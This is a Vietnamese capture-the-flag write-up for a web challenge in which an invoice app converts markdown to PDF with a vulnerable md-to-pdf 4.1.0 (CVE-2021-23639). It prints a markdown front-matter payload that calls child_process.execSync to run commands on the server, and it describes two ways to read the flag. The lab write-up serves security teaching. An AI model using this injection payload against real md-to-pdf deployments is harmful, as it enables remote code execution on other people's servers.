# CHALLENGE DESCRIPTION

Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?

**Tags:** `javasciprt`, `CVE-2021-23639`, `source-code-analysis`

# Quick Preview

Đây là một bài White Box, chúng ta được cung cấp source code của Web App.

Sau khi giải nén folder `BlinkerFluids.zip`, ta được folder có cấu trúc như sau: 

```shell
BlinkerFluids
└── web_blinkerfluids
    ├── challenge
	│   ├── helpers
	│   │   └── MDHelper.js
	│   ├── routes
	│   │   └── index.js
	│   ├── static
	│   │   ├── invoices
	│   │   ├── css
	│   │   ├── images
	│   │   └── js
	│   ├── views
	│   │   └── index.html
	│   ├── database.js
	│   ├── index.js
    │   └── package.json
    ├── config
	│   └── supervisord.conf
	├── build-docker.sh
	├── Dockerfile
	└── flag.txt
```

Đây là giao diện của website.

![](../../attachments/Pasted%20image%2020220727132908.png)

Chức năng chính của nó:
+ cho phép tạo, lưu và xoá hoá đơn 
+ convert hoá đơn thành file pdf

Thực hiện tạo mới một hoá đơn, syntax của hoá đơn này được viết bằng `markdown`.

![](../../attachments/Pasted%20image%2020220727133029.png)

Sau khi tạo hoá đơn thành công, mình sẽ được redirect về index của website.

![](../../attachments/Pasted%20image%2020220727133742.png)

Đây là khi mình click vào phần Export PDF của hoá đơn, sẽ direct sang một url có cấu trúc như sau:

`http://46.101.2.216:30568/static/invoices/f0daa85f-b9de-4b78-beff-2f86e242d6ac.pdf`

![](../../attachments/Pasted%20image%2020220727133007.png)

→ Chức năng của trang web cũng khá thú vị ha. 

# Source Code Analysis
Khi vào folder challenges, mình để ý thấy trong file `package.json` ở mục dependencies có xuất hiện một package bị lỗi `md-to-pdf` version `4.1.0`.  [CVE-2021-23639](https://github.com/advisories/GHSA-x949-7cm6-fm6p)

> Về cơ bản, package này cho phép ta thực hiện RCE thông qua việc convert sang PDF từ content của markdown.

```json
{
<--SNIP-->

	"dependencies": {
		"express": "4.17.3",
		"md-to-pdf": "4.1.0",
		"nunjucks": "3.2.3",
		"sqlite-async": "1.1.3",
		"uuid": "8.3.2"
	},
	
<--SNIP-->
}
```

# Exploit

Bắt gói tin POST khi thực hiện thêm hoá đơn bằng Burpsuite

![](../../attachments/Pasted%20image%2020220727134538.png)

Bây giờ chỉ cần replace `"dumb"` thành payload có cấu trúc như sau:

```javscript
---jsn\n((require('child_process')).execSync('<command>'))\n---RCE
```

Tới đây mình có 2 cách exploit:

## Solution 1

Để ý rằng các invoice sẽ được lưu tại một folder nhất định nào đó. Đọc file `MDHelper.js` sẽ cho ta biết được đó là folder `static/invoices/`

```javascript
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] }
                }
            );
            resolve(id);

        } catch (e) {
            reject(e);
        }
    });
}

module.exports = {
    makePDF
};
```

Lợi dụng điều này mình sẽ thực hiện tạo một file mới nằm trong `static/invoices` có nội dung của flag

![](../../attachments/Pasted%20image%2020220727140155.png)

Thực hiện tạo file thành công 

![](../../attachments/Pasted%20image%2020220727140231.png)

Bây giờ chỉ cần truy cập vào endpoint để lấy flag thôi

![](../../attachments/Pasted%20image%2020220727140800.png)

## Solution 2
Đọc trực tiếp trên file PDF sau khi render.

![](../../attachments/Pasted%20image%2020220727141643.png)

Thông báo thành công 

![](../../attachments/Pasted%20image%2020220727141359.png)

Truy cập đến invoice mà mình đã tạo

![](../../attachments/Pasted%20image%2020220727141533.png)

Tương tự, bây giờ mình đọc file flag là xong.